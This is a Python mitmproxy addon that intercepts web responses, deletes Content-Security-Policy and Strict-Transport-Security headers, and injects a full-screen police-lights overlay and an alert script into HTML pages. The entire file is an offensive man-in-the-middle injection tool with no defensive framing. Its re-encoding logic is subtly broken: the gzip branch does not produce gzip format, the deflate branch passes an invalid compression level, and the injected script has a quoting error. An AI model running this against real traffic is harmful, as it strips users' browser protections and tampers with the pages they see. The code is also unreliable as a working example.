from mitmproxy import http
import re
import zlib

OVERLAY_HTML = b"<img style='z-index:10000;width:100%;height:100%;top:0;left:0;position:fixed;opacity:0.5' src='https://cdn.winknews.com/wp-content/uploads/2019/01/Police-lights.-Photo-via-CBS-News..jpg' />"
OVERLAY_JS = b"<script>alert('You can\'t click anything on this page');</script>"

def remove_header(response, header_name):
    if header_name in response.headers:
        del response.headers[header_name]

def decode_content(content, encoding):
    if encoding == 'gzip':
        return zlib.decompress(content, 16+zlib.MAX_WBITS)
    elif encoding == 'deflate':
        try:
            return zlib.decompress(content)
        except zlib.error:
            return zlib.decompress(content, -zlib.MAX_WBITS)
    return content

def encode_content(content, encoding):
    if encoding == 'gzip':
        return zlib.compress(content)
    elif encoding == 'deflate':
        return zlib.compress(content, -zlib.MAX_WBITS)
    return content

def response(flow: http.HTTPFlow) -> None:
    print("Intercepted response for:", flow.request.pretty_url)
    
    # Remove security headers
    remove_header(flow.response, "Content-Security-Policy")
    remove_header(flow.response, "Strict-Transport-Security")
    
    # Check if content-type header exists
    if "content-type" not in flow.response.headers:
        print("No content-type header found")
        return
    
    content_type = flow.response.headers["content-type"]
    
    # Check if response is HTML and status code is 200
    if "text/html" in content_type and flow.response.status_code == 200:
        print("HTML content found, status code 200")
        
        # Decode content if it's encoded
        encoding = flow.response.headers.get('Content-Encoding', 'identity')
        decoded_content = decode_content(flow.response.content, encoding)
        
        # Modify the content
        try:
            modified_content = decoded_content + OVERLAY_HTML + OVERLAY_JS
            encoded_content = encode_content(modified_content, encoding)
            flow.response.content = encoded_content
            print("Injected HTML and JS")
        except Exception as e:
            print("Error modifying content:", e)
            return

        # Update the content length
        flow.response.headers["content-length"] = str(len(flow.response.content))
